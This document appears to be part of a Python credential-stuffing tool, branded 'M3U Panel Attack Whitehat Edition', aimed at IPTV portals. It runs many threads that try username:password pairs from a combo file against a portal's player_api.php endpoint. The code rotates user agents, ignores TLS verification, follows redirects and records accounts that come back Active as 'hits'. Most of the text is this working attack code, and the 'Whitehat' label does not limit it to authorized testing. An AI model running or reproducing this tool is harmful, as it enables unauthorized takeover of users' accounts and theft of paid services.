\033[94m║\033[93m 🔹 Status Code  {color}➢ {status_code:<3} ({status_meaning})  \033[0m
\033[94m║\033[93m 🔹 Current Time \033[92m➢ {current_time} \033[94m
\033[94m╠══════════════════════════════════════════\033[0m
\033[94m║\033[93m 🥷 Player       \033[92m➢ {nickname} \033[94m
\033[94m║\033[93m ⚔️ Attack Type  \033[92m➢ {attack_type} \033[94m
\033[94m║\033[93m 🆙 Attack Level \033[92m➢ {level}  \033[94m
\033[94m║\033[93m 🗡️ Attack Combo \033[92m➢ {combo_file_name} \033[94m
\033[94m║\033[93m ⏱️ Game Time    \033[92m➢ {time_elapsed}  \033[94m
\033[94m║\033[93m 🎯 Game Score   \033[92m➢ {total_score}  \033[94m
\033[94m╠══════════════════════════════════════════\033[0m
\033[94m║\033[92m🎮 M3U Panel Attack Whitehat Edition 🎮   \033[94m
\033[94m╚══════════════════════════════════════════\033[0m
"""
    )

def bot_worker():
    global total_hits
    global bot_count
    bot_count += 1
    start_time = time.time()

    for _ in range(combo_total_length):
        combo_line = get_combo_line()

        if not combo_line:
            continue

        try:
            username, password = map(str.strip, combo_line.split(":"))
        except ValueError:
            username = "defaultuser"
            password = "defaultpass"
            continue

        progress = round((current_combo_index / combo_total_length) * 100, 2)
        link = f"http://{portal}/player_api.php?username={username}&password={password}&type=m3u"
        
        if attack_choice == "4":
            user_agent = get_next_user_agent()
            attack_headers["User-Agent"] = user_agent
        else:
            user_agent = None
        
        while True:
            try:
                response = scraper_session.get(
                    link, headers=attack_headers, timeout=15, verify=False
                )
                status_code = response.status_code
                
                if status_code == 302:
                    link = response.headers.get('Location')
                    continue

                break
            except Exception:
                time.sleep(1)

        bot_vars = {
            "username": username,
            "password": password,
            "combo_index": current_combo_index,
            "combo_total_length": combo_total_length,
            "progress": progress,
            "total_hits": total_hits,
            "status_code": status_code,
            "portal": portal,
            "nickname": nickname,
            "attack_type": attack_type,
            "level": level,
            "combo_file_name": combo_file_name,
            "start_time": start_time,
        }

        print_status(
            bot_vars["username"],
            bot_vars["password"],
            bot_count,
            bot_vars["combo_index"],
            bot_vars["combo_total_length"],
            bot_vars["progress"],
            bot_vars["total_hits"],
            bot_vars["status_code"],
            bot_vars["portal"],
            bot_vars["nickname"],
            bot_vars["attack_type"],
            bot_vars["level"],
            bot_vars["combo_file_name"],
            bot_vars["start_time"],
        )

        data = str(response.text)

        if "username" in data:
            try:
                status = extract_status(data)
                if status == "Active":
                    print("            👽  🇭 🇮 🇹 👽           ")
                    total_hits += 1
                    if attack_choice == "4" and user_agent:
                        log_hit(total_hits, user_agent)
                    process_verification(
                        data, bot_vars["username"], bot_vars["password"]
                    )
            except IndexError:
                pass

        if attack_choice == "6" and delay_seconds > 0:
            time.sleep(delay_seconds)
            
for _ in range(int(num_bots)):
    threading.Thread(target=bot_worker).start()
